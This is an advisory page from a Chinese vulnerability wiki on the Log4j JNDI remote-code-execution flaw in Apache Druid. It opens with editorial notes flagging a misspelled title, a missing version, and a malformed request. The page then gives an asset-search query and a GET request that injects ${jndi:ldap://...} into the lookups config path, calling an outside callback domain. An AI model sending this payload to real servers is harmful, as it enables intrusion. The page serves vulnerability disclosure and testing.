---
source: "wy876 漏洞文库"
title: "Apace Druid存在Log4j 远程命令执行漏洞"
product: "Apache Druid中Log4j2日志组件"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "受影响Log4j版本/lookup配置、请求路径被日志记录、出站和JVM/gadget允许后续执行"
source_status: "unknown"
side_effects: "涉及 LDAP/RMI/DNS/HTTP 外带：回连只证明相应网络交互，不能单独证明命令执行；使用自控接收端，避免把日志、凭据或真实业务数据发送给第三方。"
id: "vw-f3baeebd48d1710a6d034c9d"
entity_id: "ve-f3baeebd48d1710a6d034c9d"
schema_version: "1"
---

# Apace Druid存在Log4j 远程命令执行漏洞

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：受影响Log4j版本/lookup配置、请求路径被日志记录、出站和JVM/gadget允许后续执行
- 证据范围：仅lookup路径请求，没有回连或执行结果；${不等于所有内容都是JNDI地址

### 本次正文校订

- 按实际内容修正 1 处代码围栏语言标记，保留其中方法与请求内容。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 标题Apace拼错，产品应Druid关联Log4j，缺版本/修复/主CVE
- GET Content-Length995却无body错误
- 外联域名需保留示例替换；DNS/LDAP回连不等同RCE
- 应与数据库Druid条目跨分类核对

### 操作风险与资料使用

- 涉及 LDAP/RMI/DNS/HTTP 外带：回连只证明相应网络交互，不能单独证明命令执行；使用自控接收端，避免把日志、凭据或真实业务数据发送给第三方。

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

# 一、漏洞简介
<font style="color:rgb(36, 41, 46);">Apache Druid是一个实时分析型数据库，旨在对大型数据集进行快速的查询分析（"OLAP"查询)。Druid最常被当做数据库来用以支持实时摄取、高性能查询和高稳定运行的应用场景，同时，Druid也通常被用来助力分析型应用的图形化界面，或者当做需要快速聚合的高并发后端API，Druid最适合应用于面向事件类型的数据。Log4j是Apache的一个开源项目，该漏洞产生的原因在于Log4j在记录日志的过程中会对日志内容进行判断，如果内容中包含了${，则Log4j会认为此字符属于JNDI远程加载类的地址。Apache Druid 使用了该项目进行记录日志，攻击者通过构造恶意的代码即可利用该漏洞，从而导致服务器权限丢失</font>

# <font style="color:rgb(36, 41, 46);">二、影响版本</font>
+ Apache Druid

# 三、资产测绘
```java
title="Apache Druid"
```


# 四、漏洞复现
```http
GET /druid/coordinator/v1/lookups/config/${jndi:ldap://pvibhhxnwt.dgrh3.cn} HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0
Content-Length: 995
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ua1fln02hehbuf7g>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
